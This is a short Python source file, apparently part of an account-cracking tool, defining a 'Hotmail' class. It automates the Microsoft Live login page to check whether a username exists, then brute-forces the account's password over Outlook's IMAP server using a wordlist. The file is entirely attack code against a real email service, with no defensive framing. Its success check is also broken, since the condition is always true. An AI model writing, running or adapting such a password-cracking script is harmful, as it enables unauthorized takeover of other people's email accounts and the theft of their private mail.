import time
import imaplib
from imaplib import IMAP4

class Hotmail:

    def __init__(self, browser):
        self.browser = browser

    def set_config(self, username, wordlist, delay):
        self.username = username
        self.name = ''
        self.host = 'imap-mail.outlook.com'
        self.port = 993
        self.wordlist = wordlist
        self.delay = delay

    def check_user(self):
        self.browser.driver.get('https://login.live.com/login.srf')
        try:
            input = self.browser.driver.find_element_by_name('loginfmt')
            #input = self.browser.driver.find_element_by_id('i0116')
            input.clear()
            input.send_keys(self.username)
            self.browser.driver.find_element_by_id('idSIButton9').click()
            err = self.browser.driver.find_element_by_id('usernameError')
            if err:
                return False
        except:
            self.name = 'Not found'
            return True

    def crack(self):
        passwords = []
        found = ''
        with open(self.wordlist, 'r') as f:
            for line in f:
                passwords.append(line.strip('\n'))
        IMAP4 = imaplib.IMAP4_SSL(self.host, self.port)
        for password in passwords:
            try:
                session = IMAP4.login(self.username, password)
                if (session == 'OK' or 'AUTHENTICATE completed'):
                    found = password
                    break
            except IMAP4.error:
                pass
            time.sleep(self.delay)
       
        IMAP4.logout()
        return found
